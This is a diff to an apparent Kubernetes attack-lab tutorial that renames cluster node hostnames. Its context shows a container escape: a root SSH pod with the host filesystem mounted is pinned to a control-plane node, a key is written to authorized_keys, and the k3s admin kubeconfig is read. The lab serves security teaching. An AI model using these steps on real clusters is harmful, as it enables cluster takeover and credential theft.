@@ -406,12 +406,12 @@ Once I have done this, I want to connect to the pod using `ssh`. For this I need
 ```
 / # kubectl -n pwn-me get pods -o wide
 NAME             READY   STATUS    RESTARTS   AGE     IP           NODE                            NOMINATED NODE   READINESS GATES
-vulnerable-app   1/1     Running   0          3m11s   10.42.2.46   k3d-pipeline-cluster-agent-1    <none>           <none>
-sshd             1/1     Running   0          20s     10.42.0.52   k3d-pipeline-cluster-agent-2    <none>           <none>
+vulnerable-app   1/1     Running   0          3m11s   10.42.2.46   k3d-erfa-agent-1    <none>           <none>
+sshd             1/1     Running   0          20s     10.42.0.52   k3d-erfa-agent-2    <none>           <none>
 ```
 
 There I can see the IP address of my newly created `sshd` pod: `10.42.0.52`. Moreover, you can
-already see here that the pod was scheduled on `k3d-pipeline-cluster-agent-2` node. I can `ssh` to
+already see here that the pod was scheduled on `k3d-erfa-agent-2` node. I can `ssh` to
 it:
 
 ```bash
@@ -431,7 +431,7 @@ What is the hostname?
 
 ```
 sshd:/# cat /etc/hostname
-k3d-pipeline-cluster-agent-2
+k3d-erfa-agent-2
 ```
 
 > Note that you might get lucky and directly land on a master node. In which case you do not need to
@@ -515,9 +515,9 @@ GLOBAL OPTIONS:
    --version, -v               print the version
 ```
 
-Note how our hostname is `k3d-pipeline-cluster-agent-2` and `k3s` takes `agent` as an argument for
+Note how our hostname is `k3d-erfa-agent-2` and `k3s` takes `agent` as an argument for
 the worker node. It seems to take `server` as an argument to run master nodes, so a good guess for a
-master node name would be `k3d-pipeline-cluster-server-0`. We will try this.
+master node name would be `k3d-erfa-server-0`. We will try this.
 
 We could not try to find some more interesting data on the node before moving on, but would wouldn't
 need to:
@@ -648,7 +648,7 @@ cluster.
 
 Nodes typically define the `kubernetes.io/hostname` label to define the name of the host of the
 node. Use this with a node affinity to schedule the SSH daemon pod onto the
-`k3d-pipeline-cluster-server-0` node.
+`k3d-erfa-server-0` node.
 
 </details>
 
@@ -657,7 +657,7 @@ node. Use this with a node affinity to schedule the SSH daemon pod onto the
 
 While we technically already performed vertical movement, we want to do this onto a control plane
 node. The approach will be exactly the same, except we want to schedule the pod onto the
-`k3d-pipeline-cluster-server-0` node.
+`k3d-erfa-server-0` node.
 
 > Note here that we are _guessing_ the hostname of the master node. However, it is a very educated
 > guess based on the worker node name, and the names `k3s` likes to give to master workloads.
@@ -702,7 +702,7 @@ spec:
           - key: kubernetes.io/hostname
             operator: In
             values:
-            - k3d-pipeline-cluster-server-0
+            - k3d-erfa-server-0
   volumes:
   - name: host-vol
     hostPath:
@@ -715,7 +715,7 @@ If we try to apply this configuration:
 ```
 / # kubectl apply -f /tmp/pod.yml
 Error from server (Forbidden): error when applying patch:
-{"metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"sshd\",\"namespace\":\"pwn-me\"},\"spec\":{\"affinity\":{\"nodeAffinity\":{\"requiredDuringSchedulingIgnoredDuringExecution\":{\"nodeSelectorTerms\":[{\"matchExpressions\":[{\"key\":\"kubernetes.io/hostname\",\"operator\":\"In\",\"values\":[\"k3d-pipeline-cluster-server-0\"]}]}]}}},\"containers\":[{\"command\":[\"sh\",\"-c\",\"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDl6OFov1sHfa+UO4X+IKu9J0B0+fU9bALBbXgJ2wvv1qn9fs2KA9K7B1z052MtjMx+S9hko2K5WFV+4O9hg6/sNqs9VGyLey3CkctgFriceM69fWxDCwK0KPxWsZ0HOPo/qEGnTrE9Nmlo/MeZXgW3EVHvpiM/UgTahTFlMYu4sblEfBUA14gnJGaUr6HzQBVXZA4+nyDfVTVDBywzoIJVyZfm92OgQXQCUi9WsJIPr5OVd+WRvzBrAXJDTzx8LJJQUG7GB50Es9mCey9lIDBmmogu9HgUw8Y8tUatqNsgJQLhsOuTBcNOdj3UFpghByW8RVaWTMuLuAAb5Vz395lbPLLavVSUJx6mnMb3tKlv7cMbBe6b5wXeVdFLPFLCyk6fHj2P/bM2chqcmJN4GXkYV4tdZATZ8PxwZm9G2DDh7p0BBtZH7LS6n3UtMP/FSX7q4B/6ipkIqbZDIlLizBjys5w4FZEVtIgmqrSy16Klg4de/usZ7ho+LbEc3f+Yo4YvJBtejawsR7nQfM9fgkSrKG/PQyec+zeWJCe4OB9wirZxzz8WpncoTpecXZIblMPEyQ+PlggLxQUiF3Q2nY3Q+KSzLaJ7dCv98eu3blYORUG9WjsLWmyYLRfjjuMGCjTwN/uYMGBz+UyffWhOIiQhBBB9g9j6SCDOb7oEfwa7kw== root@vulnerable-app' \\u003e /root/.ssh/authorized_keys \\u0026\\u0026 ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config\"],\"env\":[{\"name\":\"SSH_ENABLE_ROOT\",\"value\":\"true\"}],\"image\":\"panubo/sshd:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"sshd\",\"volumeMounts\":[{\"mountPath\":\"/srv/host\",\"name\":\"host-vol\"}]}],\"restartPolicy\":\"Always\",\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host-vol\"}]}}\n"}},"spec":{"$setElementOrder/containers":[{"name":"sshd"}],"$setElementOrder/volumes":[{"name":"host-vol"}],"affinity":{"nodeAffinity":{"requiredDuringSchedulingIgnoredDuringExecution":{"nodeSelectorTerms":[{"matchExpressions":[{"key":"kubernetes.io/hostname","operator":"In","values":["k3d-pipeline-cluster-server-0"]}]}]}}},"containers":[{"$setElementOrder/volumeMounts":[{"mountPath":"/srv/host"}],"name":"sshd"}]}}
+{"metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"sshd\",\"namespace\":\"pwn-me\"},\"spec\":{\"affinity\":{\"nodeAffinity\":{\"requiredDuringSchedulingIgnoredDuringExecution\":{\"nodeSelectorTerms\":[{\"matchExpressions\":[{\"key\":\"kubernetes.io/hostname\",\"operator\":\"In\",\"values\":[\"k3d-erfa-server-0\"]}]}]}}},\"containers\":[{\"command\":[\"sh\",\"-c\",\"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDl6OFov1sHfa+UO4X+IKu9J0B0+fU9bALBbXgJ2wvv1qn9fs2KA9K7B1z052MtjMx+S9hko2K5WFV+4O9hg6/sNqs9VGyLey3CkctgFriceM69fWxDCwK0KPxWsZ0HOPo/qEGnTrE9Nmlo/MeZXgW3EVHvpiM/UgTahTFlMYu4sblEfBUA14gnJGaUr6HzQBVXZA4+nyDfVTVDBywzoIJVyZfm92OgQXQCUi9WsJIPr5OVd+WRvzBrAXJDTzx8LJJQUG7GB50Es9mCey9lIDBmmogu9HgUw8Y8tUatqNsgJQLhsOuTBcNOdj3UFpghByW8RVaWTMuLuAAb5Vz395lbPLLavVSUJx6mnMb3tKlv7cMbBe6b5wXeVdFLPFLCyk6fHj2P/bM2chqcmJN4GXkYV4tdZATZ8PxwZm9G2DDh7p0BBtZH7LS6n3UtMP/FSX7q4B/6ipkIqbZDIlLizBjys5w4FZEVtIgmqrSy16Klg4de/usZ7ho+LbEc3f+Yo4YvJBtejawsR7nQfM9fgkSrKG/PQyec+zeWJCe4OB9wirZxzz8WpncoTpecXZIblMPEyQ+PlggLxQUiF3Q2nY3Q+KSzLaJ7dCv98eu3blYORUG9WjsLWmyYLRfjjuMGCjTwN/uYMGBz+UyffWhOIiQhBBB9g9j6SCDOb7oEfwa7kw== root@vulnerable-app' \\u003e /root/.ssh/authorized_keys \\u0026\\u0026 ./entry.sh /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config\"],\"env\":[{\"name\":\"SSH_ENABLE_ROOT\",\"value\":\"true\"}],\"image\":\"panubo/sshd:latest\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"sshd\",\"volumeMounts\":[{\"mountPath\":\"/srv/host\",\"name\":\"host-vol\"}]}],\"restartPolicy\":\"Always\",\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host-vol\"}]}}\n"}},"spec":{"$setElementOrder/containers":[{"name":"sshd"}],"$setElementOrder/volumes":[{"name":"host-vol"}],"affinity":{"nodeAffinity":{"requiredDuringSchedulingIgnoredDuringExecution":{"nodeSelectorTerms":[{"matchExpressions":[{"key":"kubernetes.io/hostname","operator":"In","values":["k3d-pipeline-cluster-server-0"]}]}]}}},"containers":[{"$setElementOrder/volumeMounts":[{"mountPath":"/srv/host"}],"name":"sshd"}]}}
 to:
 Resource: "/v1, Resource=pods", GroupVersionKind: "/v1, Kind=Pod"
 Name: "sshd", Namespace: "pwn-me"
@@ -739,8 +739,8 @@ Then we can find the IP again, `ssh` onto the pod, and check that we get the cor
 ```
 / # kubectl -n pwn-me get pods -o wide
 NAME             READY   STATUS    RESTARTS   AGE     IP           NODE                            NOMINATED NODE   READINESS GATES
-vulnerable-app   1/1     Running   0          3m11s   10.42.2.46   k3d-pipeline-cluster-agent-1    <none>           <none>
-sshd             1/1     Running   0          20s     10.42.0.53   k3d-pipeline-cluster-server-0   <none>           <none>
+vulnerable-app   1/1     Running   0          3m11s   10.42.2.46   k3d-erfa-agent-1    <none>           <none>
+sshd             1/1     Running   0          20s     10.42.0.53   k3d-erfa-server-0   <none>           <none>
 
 / # ssh 10.42.0.53
 The authenticity of host '10.42.0.53 (10.42.0.53)' can't be established.
@@ -760,7 +760,7 @@ You may change this message by editing /etc/motd.
 
 sshd:~# chroot /srv/host
 sshd:/# cat /etc/hostname
-k3d-pipeline-cluster-server-0
+k3d-erfa-server-0
 ```
 
 It worked!
@@ -868,12 +868,12 @@ that to simply have the hostname in the configuration:
 ```
 sshd:/# cp /etc/rancher/k3s/k3s.yaml /tmp/config
 sshd:/# export KUBECONFIG=/tmp/config
-sshd:/# # modify the configuration to contain https://k3d-pipeline-cluster-server-0:6443 as the server!
+sshd:/# # modify the configuration to contain https://k3d-erfa-server-0:6443 as the server!
 sshd:/# vi /tmp/config
 sshd:/# kubectl cluster-info
-Kubernetes control plane is running at https://k3d-pipeline-cluster-server-0:6443
-CoreDNS is running at https://k3d-pipeline-cluster-server-0:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
-Metrics-server is running at https://k3d-pipeline-cluster-server-0:6443/api/v1/namespaces/kube-system/services/https:metrics-server:/proxy
+Kubernetes control plane is running at https://k3d-erfa-server-0:6443
+CoreDNS is running at https://k3d-erfa-server-0:6443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
+Metrics-server is running at https://k3d-erfa-server-0:6443/api/v1/namespaces/kube-system/services/https:metrics-server:/proxy
 
 To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
 ```
